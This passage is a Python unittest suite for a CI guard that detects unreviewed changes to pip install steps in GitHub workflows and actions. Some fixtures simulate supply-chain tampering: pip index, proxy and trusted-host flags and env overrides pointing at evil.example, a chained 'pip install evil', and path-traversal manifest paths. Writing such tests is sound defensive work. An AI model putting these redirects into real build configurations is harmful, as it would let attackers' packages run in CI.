"""Durable regression tests for the install drift guard (#685, design #684).

Run: python -m unittest discover -s .github/scripts -p 'test_install_drift_guard.py' -v

Every security property of the guard is pinned here. Fixture repositories are
built in temporary directories; the real repository is checked in
``RealRepositoryTests``.
"""

from __future__ import annotations

import ast
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from typing import ClassVar

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import install_drift_guard as guard

REPO_ROOT = HERE.parents[1]
GUARD_SCRIPT = HERE / "install_drift_guard.py"
GUARD_WORKFLOW = REPO_ROOT / ".github" / "workflows" / "install-drift-guard.yml"
GUARD_REQUIREMENTS = HERE / "requirements-pip-install-guard.txt"
BOOTSTRAP_RUN = (
    "python -m pip install -r .github/scripts/requirements-pip-install-guard.txt"
)

APP_WORKFLOW = """\
name: app
on: push
env:
  GLOBAL: "1"
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install deps
        run: pip install -r requirements.txt
      - name: Lint
        run: echo lint
      - id: magic
        run: |
          pip install python-magic
  other:
    runs-on: ubuntu-latest
    steps:
      - name: Noop
        run: echo hi
"""

SETUP_ACTION = """\
name: setup
description: setup
runs:
  using: composite
  steps:
    - name: Install magic
      shell: bash
      run: pip install python-magic
"""

WF = ".github/workflows/app.yml"
ACTION = ".github/actions/setup/action.yml"
CTX_DEPS = f"{WF}::jobs.build::name:Install deps"
CTX_MAGIC = f"{WF}::jobs.build::id:magic"
CTX_ACTION = f"{ACTION}::runs.steps::name:Install magic"


def codes(findings):
    return {f.code for f in findings}


class FixtureRepo:
    """A throwaway repository with workflows/actions and a baseline manifest."""

    def __init__(self, files=None):
        self.root = Path(tempfile.mkdtemp(prefix="install-drift-guard-"))
        for rel, content in (files or {}).items():
            self.write(rel, content)

    def cleanup(self):
        shutil.rmtree(self.root, ignore_errors=True)

    def write(self, rel, content):
        path = self.root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            path.write_bytes(content)
        else:
            path.write_bytes(content.encode("utf-8"))

    def read(self, rel):
        return (self.root / rel).read_bytes().decode("utf-8")

    def replace(self, rel, old, new):
        text = self.read(rel)
        assert old in text, f"fixture edit anchor not found: {old!r}"
        self.write(rel, text.replace(old, new, 1))

    def remove(self, rel):
        (self.root / rel).unlink()

    @property
    def manifest_path(self):
        return self.root / guard.MANIFEST_REL

    def authorize(self):
        """Operator action: regenerate the baseline and fill in review fields."""
        manifest = guard.build_manifest(self.root, existing=None)
        for entry in manifest["entries"]:
            entry["reason"] = "fixture authorization"
            entry["owner"] = "@fixture"
            entry["remediation_issue"] = "#600"
        self.write_manifest(manifest)
        return manifest

    def write_manifest(self, manifest):
        self.manifest_path.parent.mkdir(parents=True, exist_ok=True)
        self.manifest_path.write_bytes(guard.render_manifest(manifest).encode("utf-8"))

    def load_manifest_json(self):
        return json.loads(self.manifest_path.read_bytes().decode("utf-8"))

    def verify(self):
        return guard.verify(self.root)


class GuardTestCase(unittest.TestCase):
    files: ClassVar[dict[str, str]] = {WF: APP_WORKFLOW, ACTION: SETUP_ACTION}

    def setUp(self):
        self.repo = FixtureRepo(self.files)
        self.addCleanup(self.repo.cleanup)
        self.repo.authorize()

    def assertGreen(self):
        findings = self.repo.verify()
        self.assertEqual(findings, [], "\n".join(map(str, findings)))

    def assertRed(self, *expected_codes):
        findings = self.repo.verify()
        self.assertTrue(findings, "expected RED but guard passed")
        for code in expected_codes:
            self.assertIn(code, codes(findings), "\n".join(map(str, findings)))
        return findings


# ---------------------------------------------------------------- A. BASELINE
class BaselineTests(GuardTestCase):
    def test_01_current_fixture_baseline_green(self):
        self.assertGreen()
        contexts = [e["context"] for e in self.repo.load_manifest_json()["entries"]]
        self.assertEqual(contexts, sorted([CTX_DEPS, CTX_MAGIC, CTX_ACTION]))

    def test_02_unknown_relevant_block_red(self):
        self.repo.replace(
            WF,
            "      - name: Lint\n",
            "      - name: New install\n        run: pip install foo\n      - name: Lint\n",
        )
        findings = self.assertRed("UNKNOWN_BLOCK")
        self.assertIn(
            f"{WF}::jobs.build::name:New install", {f.context for f in findings}
        )

    def test_03_one_token_modification_red(self):
        self.repo.replace(
            WF, "pip install -r requirements.txt", "pip install -r requirements-dev.txt"
        )
        findings = self.assertRed("CHANGED_BLOCK")
        changed = [f for f in findings if f.code == "CHANGED_BLOCK"]
        self.assertEqual(changed[0].context, CTX_DEPS)
        self.assertIn("requirements-dev.txt", changed[0].message)  # unified diff

    def test_04_appended_package_red(self):
        self.repo.replace(
            WF, "pip install python-magic\n", "pip install python-magic evil-package\n"
        )
        self.assertRed("CHANGED_BLOCK")

    def test_05_index_proxy_trusted_host_inline_change_red(self):
        for flag in (
            "--index-url https://evil.example/simple",
            "--extra-index-url https://evil.example/simple",
            "--proxy http://evil.example:3128",
            "--trusted-host evil.example",
        ):
            with self.subTest(flag=flag):
                self.repo.authorize()
                self.repo.write(
                    WF,
                    APP_WORKFLOW.replace(
                        "pip install -r requirements.txt",
                        f"pip install {flag} -r requirements.txt",
                    ),
                )
                self.assertRed("CHANGED_BLOCK")

    def test_06_relevant_env_change_red(self):
        edits = {
            "step PIP_": (
                "      - id: magic\n",
                "      - id: magic\n        env:\n          PIP_INDEX_URL: https://evil.example/simple\n",
            ),
            "job UV_": (
                "  build:\n    runs-on: ubuntu-latest\n",
                "  build:\n    runs-on: ubuntu-latest\n    env:\n      UV_INDEX_URL: https://evil.example/simple\n",
            ),
            "workflow PYTHONPATH": (
                '  GLOBAL: "1"\n',
                '  GLOBAL: "1"\n  PYTHONPATH: /tmp/evil\n',
            ),
            "workflow PIP_ value": (
                '  GLOBAL: "1"\n',
                '  GLOBAL: "1"\n  PIP_TRUSTED_HOST: evil.example\n',
            ),
        }
        for label, (old, new) in edits.items():
            with self.subTest(scope=label):
                self.repo.write(WF, APP_WORKFLOW)
                self.repo.authorize()
                self.repo.replace(WF, old, new)
                self.assertRed("CHANGED_BLOCK")

    def test_06b_relevant_env_value_change_red_and_irrelevant_env_ignored(self):
        with_env = APP_WORKFLOW.replace(
            '  GLOBAL: "1"\n',
            '  GLOBAL: "1"\n  PIP_INDEX_URL: https://pypi.org/simple\n',
        )
        self.repo.write(WF, with_env)
        self.repo.authorize()
        self.assertGreen()
        stored = {e["context"]: e for e in self.repo.load_manifest_json()["entries"]}
        self.assertEqual(
            stored[CTX_MAGIC]["behavior"]["env"],
            {"PIP_INDEX_URL": "https://pypi.org/simple"},
        )
        # non-relevant env keys are not part of the behavior
        self.repo.replace(WF, '  GLOBAL: "1"\n', '  GLOBAL: "2"\n')
        self.assertGreen()
        # step-level override of an inherited relevant key changes behavior
        self.repo.replace(
            WF,
            "      - id: magic\n",
            "      - id: magic\n        env:\n          PIP_INDEX_URL: https://evil.example/simple\n",
        )
        self.assertRed("CHANGED_BLOCK")

    def test_07_shell_change_red(self):
        edits = {
            "step": ("      - id: magic\n", "      - id: magic\n        shell: sh\n"),
            "job defaults": (
                "  build:\n    runs-on: ubuntu-latest\n",
                "  build:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: sh\n",
            ),
            "workflow defaults": (
                "jobs:\n",
                "defaults:\n  run:\n    shell: python\njobs:\n",
            ),
        }
        for label, (old, new) in edits.items():
            with self.subTest(scope=label):
                self.repo.write(WF, APP_WORKFLOW)
                self.repo.authorize()
                self.repo.replace(WF, old, new)
                self.assertRed("CHANGED_BLOCK")

    def test_07b_composite_shell_change_red(self):
        self.repo.replace(ACTION, "shell: bash", "shell: sh")
        findings = self.assertRed("CHANGED_BLOCK")
        self.assertIn(CTX_ACTION, {f.context for f in findings})

    def test_08_working_directory_change_red(self):
        edits = {
            "step": (
                "      - id: magic\n",
                "      - id: magic\n        working-directory: apps/api\n",
            ),
            "job defaults": (
                "  build:\n    runs-on: ubuntu-latest\n",
                "  build:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: apps/api\n",
            ),
            "workflow defaults": (
                "jobs:\n",
                "defaults:\n  run:\n    working-directory: apps/api\njobs:\n",
            ),
        }
        for label, (old, new) in edits.items():
            with self.subTest(scope=label):
                self.repo.write(WF, APP_WORKFLOW)
                self.repo.authorize()
                self.repo.replace(WF, old, new)
                self.assertRed("CHANGED_BLOCK")

    def test_08b_step_overrides_job_default_resolution(self):
        text = APP_WORKFLOW.replace(
            "  build:\n    runs-on: ubuntu-latest\n",
            "  build:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: sh\n        working-directory: apps\n",
        ).replace("      - id: magic\n", "      - id: magic\n        shell: bash\n")
        self.repo.write(WF, text)
        manifest = self.repo.authorize()
        stored = {e["context"]: e["behavior"] for e in manifest["entries"]}
        self.assertEqual(stored[CTX_MAGIC]["shell"], "bash")
        self.assertEqual(stored[CTX_MAGIC]["working_directory"], "apps")
        self.assertEqual(stored[CTX_DEPS]["shell"], "sh")

    def test_09_chained_command_change_red(self):
        self.repo.replace(
            WF,
            "pip install -r requirements.txt",
            "pip install -r requirements.txt && pip install evil",
        )
        self.assertRed("CHANGED_BLOCK")

    def test_10_pip_variant_change_red(self):
        for variant in ("pip3", "pip3.11", "python -m pip", "python3 -m pip", "uv pip"):
            with self.subTest(variant=variant):
                self.repo.write(
                    WF,
                    APP_WORKFLOW.replace(
                        "pip install -r requirements.txt",
                        f"{variant} install -r requirements.txt",
                    ),
                )
                self.assertRed("CHANGED_BLOCK")

    def test_10b_expressions_kept_literal(self):
        text = APP_WORKFLOW.replace(
            "pip install -r requirements.txt", "pip install ${{ inputs.pkg }}"
        )
        self.repo.write(WF, text)
        manifest = self.repo.authorize()
        stored = {e["context"]: e["behavior"] for e in manifest["entries"]}
        self.assertEqual(stored[CTX_DEPS]["run"], "pip install ${{ inputs.pkg }}")
        self.repo.replace(WF, "${{ inputs.pkg }}", "${{ inputs.other }}")
        self.assertRed("CHANGED_BLOCK")


# ---------------------------------------------------------------- B. CONTEXT
class ContextTests(GuardTestCase):
    def test_11_copy_identical_block_to_another_file_red(self):
        self.repo.write(".github/workflows/copy.yml", APP_WORKFLOW)
        findings = self.assertRed("UNKNOWN_BLOCK")
        self.assertIn(
            ".github/workflows/copy.yml::jobs.build::name:Install deps",
            {f.context for f in findings},
        )
        self.assertNotIn("STALE_ENTRY", codes(findings))

    def test_11b_copy_identical_block_to_another_step_red(self):
        self.repo.replace(
            WF,
            "      - name: Lint\n",
            "      - name: Install deps again\n        run: pip install -r requirements.txt\n      - name: Lint\n",
        )
        self.assertRed("UNKNOWN_BLOCK")

    def test_12_move_to_another_job_red(self):
        text = APP_WORKFLOW.replace(
            "      - name: Install deps\n        run: pip install -r requirements.txt\n",
            "",
        ).replace(
            "      - name: Noop\n",
            "      - name: Install deps\n        run: pip install -r requirements.txt\n      - name: Noop\n",
        )
        self.repo.write(WF, text)
        findings = self.assertRed("UNKNOWN_BLOCK", "STALE_ENTRY")
        self.assertIn(
            f"{WF}::jobs.other::name:Install deps", {f.context for f in findings}
        )

    def test_13_change_step_id_or_name_red(self):
        for old, new in (
            ("- name: Install deps", "- name: Install dependencies"),
            ("- id: magic", "- id: magic2"),
        ):
            with self.subTest(edit=new):
                self.repo.write(WF, APP_WORKFLOW.replace(old, new))
                self.assertRed("UNKNOWN_BLOCK", "STALE_ENTRY")

    def test_13b_adding_id_to_named_step_changes_context(self):
        self.repo.replace(
            WF,
            "      - name: Install deps\n",
            "      - name: Install deps\n        id: deps\n",
        )
        findings = self.assertRed("UNKNOWN_BLOCK", "STALE_ENTRY")
        self.assertIn(f"{WF}::jobs.build::id:deps", {f.context for f in findings})

    def test_14_unrelated_preceding_step_insertion_green(self):
        self.repo.replace(
            WF,
            "      - uses: actions/checkout@v4\n",
            "      - uses: actions/checkout@v4\n      - name: Unrelated\n        run: echo unrelated\n      - uses: actions/cache@v4\n",
        )
        self.assertGreen()
        self.repo.replace(
            ACTION,
            "  steps:\n",
            "  steps:\n    - name: First\n      shell: bash\n      run: echo first\n",
        )
        self.assertGreen()

    def test_15_step_reorder_green(self):
        text = APP_WORKFLOW.replace(
            "      - name: Install deps\n        run: pip install -r requirements.txt\n      - name: Lint\n        run: echo lint\n      - id: magic\n        run: |\n          pip install python-magic\n",
            "      - id: magic\n        run: |\n          pip install python-magic\n      - name: Lint\n        run: echo lint\n      - name: Install deps\n        run: pip install -r requirements.txt\n",
        )
        self.assertNotEqual(text, APP_WORKFLOW)
        self.repo.write(WF, text)
        self.assertGreen()

    def test_15b_job_reorder_green(self):
        build, other = APP_WORKFLOW.split("  other:\n")
        head, build_job = build.split("  build:\n")
        self.repo.write(WF, head + "  other:\n" + other + "  build:\n" + build_job)
        self.assertGreen()

    def test_16_missing_id_and_name_red(self):
        self.repo.replace(
            WF,
            "      - name: Lint\n",
            "      - run: pip install foo\n      - name: Lint\n",
        )
        findings = self.assertRed("MISSING_STEP_KEY")
        self.assertTrue(any("add a unique step id" in f.message for f in findings))

    def test_16b_missing_key_in_composite_red(self):
        self.repo.replace(
            ACTION,
            "  steps:\n",
            "  steps:\n    - shell: bash\n      run: pip install foo\n",
        )
        self.assertRed("MISSING_STEP_KEY")

    def test_16c_irrelevant_unnamed_step_ignored(self):
        self.repo.replace(
            WF,
            "      - name: Lint\n",
            "      - run: echo unnamed\n      - name: Lint\n",
        )
        self.assertGreen()

    def test_17_duplicate_name_red(self):
        self.repo.replace(
            WF,
            "      - name: Lint\n",
            "      - name: Install deps\n        run: pip install other\n      - name: Lint\n",
        )
        findings = self.assertRed("DUPLICATE_CONTEXT")
        self.assertTrue(any("add a unique step id" in f.message for f in findings))

    def test_17b_duplicate_id_red(self):
        self.repo.replace(
            WF,
            "      - name: Lint\n",
            "      - id: magic\n        run: pip install other\n      - name: Lint\n",
        )
        self.assertRed("DUPLICATE_CONTEXT")

    def test_17c_same_name_in_different_jobs_is_distinct(self):
        self.repo.replace(
            WF,
            "      - name: Noop\n",
            "      - name: Install deps\n        run: pip install -r requirements.txt\n      - name: Noop\n",
        )
        findings = self.assertRed("UNKNOWN_BLOCK")
        self.assertNotIn("DUPLICATE_CONTEXT", codes(findings))
        self.repo.authorize()
        self.assertGreen()


# ---------------------------------------------------------------- C. YAML
class YamlCoverageTests(unittest.TestCase):
    def setUp(self):
        self.repo = FixtureRepo({WF: APP_WORKFLOW})
        self.addCleanup(self.repo.cleanup)
        self.repo.authorize()

    def _assert_covered(self, rel, content, expected_context):
        self.repo.write(rel, content)
        findings = self.repo.verify()
        unknown = {f.context for f in findings if f.code == "UNKNOWN_BLOCK"}
        self.assertIn(expected_context, unknown, "\n".join(map(str, findings)))
        self.repo.authorize()
        self.assertEqual(self.repo.verify(), [])

    def test_18_yml_workflow(self):
        self._assert_covered(
            ".github/workflows/extra.yml",
            APP_WORKFLOW,
            ".github/workflows/extra.yml::jobs.build::name:Install deps",
        )

    def test_19_yaml_workflow(self):
        self._assert_covered(
            ".github/workflows/extra.yaml",
            APP_WORKFLOW,
            ".github/workflows/extra.yaml::jobs.build::name:Install deps",
        )

    def test_19b_nested_workflow_directory(self):
        self._assert_covered(
            ".github/workflows/sub/extra.yaml",
            APP_WORKFLOW,
            ".github/workflows/sub/extra.yaml::jobs.build::name:Install deps",
        )

    def test_20_yml_composite_action(self):
        self._assert_covered(
            ".github/actions/a/action.yml",
            SETUP_ACTION,
            ".github/actions/a/action.yml::runs.steps::name:Install magic",
        )

    def test_21_yaml_composite_action(self):
        self._assert_covered(
            ".github/actions/b/action.yaml",
            SETUP_ACTION,
            ".github/actions/b/action.yaml::runs.steps::name:Install magic",
        )

    def test_21b_uppercase_extension_scanned(self):
        self._assert_covered(
            ".github/workflows/UPPER.YML",
            APP_WORKFLOW,
            ".github/workflows/UPPER.YML::jobs.build::name:Install deps",
        )

    def test_22_malformed_yaml_red(self):
        self.repo.write(
            ".github/workflows/bad.yml", "on: push\njobs:\n  x: [unclosed\n"
        )
        self.assertIn("YAML_ERROR", codes(self.repo.verify()))

    def test_22b_invalid_utf8_red(self):
        self.repo.write(
            ".github/workflows/bad.yml", b"on: push\njobs: {}\n# \xff\xfe\n"
        )
        self.assertIn("YAML_ERROR", codes(self.repo.verify()))

    def test_22c_multi_document_red(self):
        self.repo.write(
            ".github/workflows/bad.yml", "on: push\njobs: {}\n---\non: push\n"
        )
        self.assertIn("YAML_ERROR", codes(self.repo.verify()))

    def test_23_duplicate_yaml_key_red(self):
        cases = {
            "top-level": APP_WORKFLOW + "jobs:\n  x:\n    runs-on: y\n",
            "step run": APP_WORKFLOW.replace(
                "        run: pip install -r requirements.txt\n",
                "        run: pip install -r requirements.txt\n        run: echo shadow\n",
            ),
            "env key": APP_WORKFLOW.replace(
                '  GLOBAL: "1"\n', '  GLOBAL: "1"\n  GLOBAL: "2"\n'
            ),
        }
        for label, text in cases.items():
            with self.subTest(case=label):
                self.repo.write(WF, text)
                findings = self.repo.verify()
                yaml_errors = [f for f in findings if f.code == "YAML_ERROR"]
                self.assertTrue(yaml_errors, "\n".join(map(str, findings)))
                self.assertIn("duplicate", yaml_errors[0].message.lower())

    def test_23b_merge_key_is_not_a_duplicate(self):
        text = "x-defaults: &d\n  runs-on: ubuntu-latest\n" + APP_WORKFLOW.replace(
            "  other:\n    runs-on: ubuntu-latest\n",
            "  other:\n    <<: *d\n    runs-on: ubuntu-latest\n",
        )
        self.repo.write(WF, text)
        self.assertEqual(self.repo.verify(), [])

    def test_23c_alias_expands_into_each_context(self):
        text = APP_WORKFLOW.replace(
            "        run: pip install -r requirements.txt\n",
            "        run: &inst pip install -r requirements.txt\n",
        ).replace(
            "      - name: Noop\n        run: echo hi\n",
            "      - name: Noop\n        run: *inst\n",
        )
        self.repo.write(WF, text)
        findings = self.repo.verify()
        self.assertIn(
            f"{WF}::jobs.other::name:Noop",
            {f.context for f in findings if f.code == "UNKNOWN_BLOCK"},
        )

    def test_24_non_string_run_red(self):
        for value in ("[pip, install]", "{a: b}", "42", "null"):
            with self.subTest(run=value):
                self.repo.write(
                    WF,
                    APP_WORKFLOW.replace(
                        "        run: echo lint\n", f"        run: {value}\n"
                    ),
                )
                self.assertIn("SCHEMA_ERROR", codes(self.repo.verify()))

    def test_25_malformed_steps_red(self):
        cases = {
            "steps mapping": APP_WORKFLOW.replace(
                "      - name: Noop\n        run: echo hi\n",
                "      noop:\n        run: echo hi\n",
            ),
            "step scalar": APP_WORKFLOW.replace(
                "      - name: Noop\n        run: echo hi\n", "      - just-a-string\n"
            ),
            "jobs list": "name: x\non: push\njobs:\n  - build\n",
            "no jobs": "name: x\non: push\n",
            "workflow not mapping": "- a\n- b\n",
            "action without runs": "name: a\ndescription: b\n",
            "composite steps mapping": SETUP_ACTION.replace(
                "  steps:\n    - name", "  steps:\n    first:\n      name"
            ),
        }
        for label, text in cases.items():
            with self.subTest(case=label):
                self.repo.write(WF, APP_WORKFLOW)
                target = ACTION if label.startswith(("action", "composite")) else WF
                self.repo.write(target, text)
                self.assertIn("SCHEMA_ERROR", codes(self.repo.verify()))
                if target == ACTION:
                    self.repo.remove(ACTION)

    def test_25b_non_string_step_key_or_shell_red(self):
        for old, new in (
            ("- id: magic", "- id: [magic]"),
            ("      - id: magic\n", "      - id: magic\n        shell: [bash]\n"),
        ):
            with self.subTest(edit=new):
                self.repo.write(WF, APP_WORKFLOW.replace(old, new))
                self.assertIn("SCHEMA_ERROR", codes(self.repo.verify()))

    def test_25c_env_expression_mapping_red_for_relevant_block(self):
        self.repo.replace(
            WF,
            "      - id: magic\n",
            "      - id: magic\n        env: ${{ fromJSON(inputs.env) }}\n",
        )
        self.assertIn("SCHEMA_ERROR", codes(self.repo.verify()))

    def test_25d_relevant_run_outside_step_position_red(self):
        self.repo.replace(
            WF,
            "      - uses: actions/checkout@v4\n",
            "      - uses: some/action@v1\n        with:\n          run: pip install evil\n",
        )
        self.assertIn("UNRECOGNIZED_RUN", codes(self.repo.verify()))

    def test_25e_symlink_in_scan_root_red(self):
        target = self.repo.root / WF
        os.symlink(target, self.repo.root / ".github/workflows/link.yml")
        self.assertIn("SCHEMA_ERROR", codes(self.repo.verify()))

    def test_26_folded_scalar_change_red(self):
        folded = APP_WORKFLOW.replace(
            "        run: |\n          pip install python-magic\n",
            "        run: >\n          pip install\n          python-magic\n",
        )
        self.repo.write(WF, folded)
        manifest = self.repo.authorize()
        stored = {e["context"]: e["behavior"] for e in manifest["entries"]}
        self.assertEqual(stored[CTX_MAGIC]["run"], "pip install python-magic\n")
        # same words as a literal block: different parsed value -> RED
        self.repo.write(WF, folded.replace("run: >\n", "run: |\n"))
        self.assertIn("CHANGED_BLOCK", codes(self.repo.verify()))
        # folded content change -> RED
        self.repo.write(
            WF,
            folded.replace("          python-magic\n", "          python-magic evil\n"),
        )
        self.assertIn("CHANGED_BLOCK", codes(self.repo.verify()))
        # chomping indicator change -> RED (no trailing-newline normalization)
        self.repo.write(WF, folded.replace("run: >\n", "run: >-\n"))
        self.assertIn("CHANGED_BLOCK", codes(self.repo.verify()))

    def test_27_literal_multiline_change_red(self):
        self.repo.replace(
            WF,
            "          pip install python-magic\n",
            "          pip install python-magic\n          echo done\n",
        )
        self.assertIn("CHANGED_BLOCK", codes(self.repo.verify()))

    def test_27b_whitespace_and_comment_changes_red(self):
        for old, new in (
            (
                "          pip install python-magic\n",
                "          pip  install python-magic\n",
            ),
            (
                "          pip install python-magic\n",
                "          pip install python-magic  \n",
            ),
            (
                "          pip install python-magic\n",
                "          pip install python-magic # note\n",
            ),
            (
                "          pip install python-magic\n",
                "          PIP install python-magic\n",
            ),
        ):
            with self.subTest(new=new):
                self.repo.write(WF, APP_WORKFLOW.replace(old, new))
                self.assertIn("CHANGED_BLOCK", codes(self.repo.verify()))

    def test_27c_yaml_comment_outside_scalar_green(self):
        self.repo.replace(
            WF,
            "      - id: magic\n",
            "      # yaml comment, not part of the run value\n      - id: magic\n",
        )
        self.assertEqual(self.repo.verify(), [])

    def test_28_continuation_change_red(self):
        cont = APP_WORKFLOW.replace(
            "        run: |\n          pip install python-magic\n",
            "        run: |\n          pip install \\\n            python-magic\n",
        )
        self.repo.write(WF, cont)
        manifest = self.repo.authorize()
        stored = {e["context"]: e["behavior"] for e in manifest["entries"]}
        self.assertEqual(stored[CTX_MAGIC]["run"], "pip install \\\n  python-magic\n")
        self.assertEqual(self.repo.verify(), [])
        # joining the continuation onto one line is a change
        self.repo.write(WF, APP_WORKFLOW)
        self.assertIn("CHANGED_BLOCK", codes(self.repo.verify()))
        # changing the continued line is a change
        self.repo.write(
            WF,
            cont.replace(
                "            python-magic\n", "            python-magic evil\n"
            ),
        )
        self.assertIn("CHANGED_BLOCK", codes(self.repo.verify()))


# ---------------------------------------------------------------- D. MANIFEST
class ManifestTests(GuardTestCase):
    def _mutate_manifest(self, mutate):
        manifest = self.repo.load_manifest_json()
        mutate(manifest)
        self.repo.write_manifest(manifest)

    def _entry(self, manifest, context):
        return next(e for e in manifest["entries"] if e["context"] == context)

    def test_29_stale_entry_removed_block_red(self):
        self.repo.replace(
            WF,
            "      - id: magic\n        run: |\n          pip install python-magic\n",
            "",
        )
        findings = self.assertRed("STALE_ENTRY")
        stale = [f for f in findings if f.code == "STALE_ENTRY"]
        self.assertEqual(stale[0].context, CTX_MAGIC)
        self.assertIn("remove", stale[0].message.lower())

    def test_29b_stale_entry_block_no_longer_relevant_red(self):
        self.repo.replace(
            WF,
            "          pip install python-magic\n",
            "          echo nothing to install\n",
        )
        findings = self.assertRed("STALE_ENTRY")
        self.assertEqual(
            [f.context for f in findings if f.code == "STALE_ENTRY"], [CTX_MAGIC]
        )

    def test_29c_stale_entry_file_deleted_red(self):
        self.repo.remove(ACTION)
        self.assertRed("STALE_ENTRY")

    def test_30_duplicate_manifest_entry_red(self):
        self._mutate_manifest(
            lambda m: m["entries"].append(dict(self._entry(m, CTX_DEPS)))
        )
        self.assertRed("DUPLICATE_ENTRY")

    def test_31_out_of_root_manifest_path_red(self):
        for bad_file in (
            "apps/api/ci.yml",
            ".github/workflows/../../x.yml",
            "/etc/x.yml",
            ".github/scripts/x.yml",
            ".github/workflows\\x.yml",
            ".github/workflows/x.txt",
        ):
            with self.subTest(file=bad_file):
                self.repo.authorize()

                def mutate(m, bad_file=bad_file):
                    e = self._entry(m, CTX_DEPS)
                    e["file"] = bad_file
                    e["context"] = f"{bad_file}::jobs.build::name:Install deps"

                self._mutate_manifest(mutate)
                self.assertRed("MANIFEST_ERROR")

    def test_31b_context_not_matching_file_red(self):
        self._mutate_manifest(
            lambda m: self._entry(m, CTX_DEPS).__setitem__(
                "file", ".github/workflows/other.yml"
            )
        )
        self.assertRed("MANIFEST_ERROR")

    def test_32_tampered_behavior_with_old_digest_red(self):
        self._mutate_manifest(
            lambda m: self._entry(m, CTX_DEPS)["behavior"].__setitem__(
                "run", "pip install anything"
            )
        )
        self.assertRed("DIGEST_MISMATCH")

    def test_32b_tampered_behavior_with_recomputed_digest_red(self):
        def mutate(m):
            e = self._entry(m, CTX_DEPS)
            e["behavior"]["run"] = "pip install anything"
            e["sha256"] = guard.behavior_digest(e["behavior"])

        self._mutate_manifest(mutate)
        self.assertRed("CHANGED_BLOCK")

    def test_33_tampered_digest_red(self):
        self._mutate_manifest(
            lambda m: self._entry(m, CTX_DEPS).__setitem__("sha256", "0" * 64)
        )
        self.assertRed("DIGEST_MISMATCH")

    def test_33b_invalid_digest_format_red(self):
        for bad in ("ABC", "A" * 64, "g" * 64, 123):
            with self.subTest(digest=bad):
                self.repo.authorize()
                self._mutate_manifest(
                    lambda m, bad=bad: self._entry(m, CTX_DEPS).__setitem__(
                        "sha256", bad
                    )
                )
                self.assertRed("MANIFEST_ERROR")

    def test_34_invalid_manifest_schema_red(self):
        mutations = {
            "missing reason": lambda m: self._entry(m, CTX_DEPS).pop("reason"),
            "extra key": lambda m: self._entry(m, CTX_DEPS).__setitem__(
                "approved", True
            ),
            "behavior extra key": lambda m: self._entry(m, CTX_DEPS)[
                "behavior"
            ].__setitem__("extra", 1),
            "behavior missing env": lambda m: self._entry(m, CTX_DEPS)["behavior"].pop(
                "env"
            ),
            "run not string": lambda m: self._entry(m, CTX_DEPS)[
                "behavior"
            ].__setitem__("run", 1),
            "env not mapping": lambda m: self._entry(m, CTX_DEPS)[
                "behavior"
            ].__setitem__("env", []),
            "wrong schema": lambda m: m.__setitem__("schema", "v0"),
            "entries not list": lambda m: m.__setitem__("entries", {}),
            "top-level extra": lambda m: m.__setitem__("note", "x"),
            "placeholder reason": lambda m: self._entry(m, CTX_DEPS).__setitem__(
                "reason", "TODO: justify"
            ),
            "empty owner": lambda m: self._entry(m, CTX_DEPS).__setitem__("owner", ""),
            "placeholder owner": lambda m: self._entry(m, CTX_DEPS).__setitem__(
                "owner", "TODO"
            ),
            "bad remediation issue": lambda m: self._entry(m, CTX_DEPS).__setitem__(
                "remediation_issue", "600"
            ),
        }
        for label, mutate in mutations.items():
            with self.subTest(case=label):
                self.repo.authorize()
                manifest = self.repo.load_manifest_json()
                mutate(manifest)
                # write raw (not via render_manifest, which would normalise
                # top-level shape and hide the defect under test)
                raw = (
                    json.dumps(manifest, indent=2, sort_keys=True, ensure_ascii=False)
                    + "\n"
                )
                self.repo.manifest_path.write_bytes(raw.encode("utf-8"))
                self.assertRed("MANIFEST_ERROR")

    def test_34b_unparseable_or_missing_manifest_red(self):
        cases = {
            "not json": b"{not json",
            "duplicate json key": b'{"schema": "a", "schema": "b", "entries": []}',
            "not utf-8": b"\xff\xfe",
        }
        for label, raw in cases.items():
            with self.subTest(case=label):
                self.repo.manifest_path.write_bytes(raw)
                self.assertRed("MANIFEST_ERROR")
        self.repo.manifest_path.unlink()
        self.assertRed("MANIFEST_ERROR")

    def test_34c_non_canonical_manifest_red(self):
        manifest = self.repo.load_manifest_json()
        self.repo.manifest_path.write_bytes(json.dumps(manifest).encode("utf-8"))
        self.assertRed("MANIFEST_ERROR")
        # entries out of context order (hand-edited) are non-canonical
        manifest["entries"].reverse()
        body = json.dumps(manifest, indent=2, sort_keys=True, ensure_ascii=False) + "\n"
        self.repo.manifest_path.write_bytes(body.encode("utf-8"))
        self.assertRed("MANIFEST_ERROR")

    def test_35_empty_repository_scan_red(self):
        empty = FixtureRepo({})
        self.addCleanup(empty.cleanup)
        empty.write_manifest({"schema": guard.MANIFEST_SCHEMA, "entries": []})
        self.assertIn("EMPTY_SCAN", codes(empty.verify()))
        empty.write(".github/workflows/README.md", "not yaml")
        self.assertIn("EMPTY_SCAN", codes(empty.verify()))

    def test_35b_no_run_blocks_red(self):
        empty = FixtureRepo(
            {
                ".github/workflows/x.yml": "on: push\njobs:\n  a:\n    uses: org/repo/.github/workflows/w.yml@v1\n"
            }
        )
        self.addCleanup(empty.cleanup)
        empty.write_manifest({"schema": guard.MANIFEST_SCHEMA, "entries": []})
        self.assertIn("EMPTY_SCAN", codes(empty.verify()))


class BaselineUpdateTests(GuardTestCase):
    def test_update_is_deterministic(self):
        first = guard.render_manifest(
            guard.build_manifest(
                self.repo.root, existing=self.repo.load_manifest_json()
            )
        )
        second = guard.render_manifest(
            guard.build_manifest(
                self.repo.root, existing=self.repo.load_manifest_json()
            )
        )
        self.assertEqual(first, second)
        self.assertEqual(first, self.repo.manifest_path.read_bytes().decode("utf-8"))

    def test_update_preserves_review_fields_and_marks_new_entries_for_review(self):
        self.repo.replace(
            WF,
            "      - name: Lint\n",
            "      - name: New install\n        run: pip install foo\n      - name: Lint\n",
        )
        manifest = guard.build_manifest(
            self.repo.root, existing=self.repo.load_manifest_json()
        )
        by_ctx = {e["context"]: e for e in manifest["entries"]}
        self.assertEqual(by_ctx[CTX_DEPS]["reason"], "fixture authorization")
        self.assertTrue(
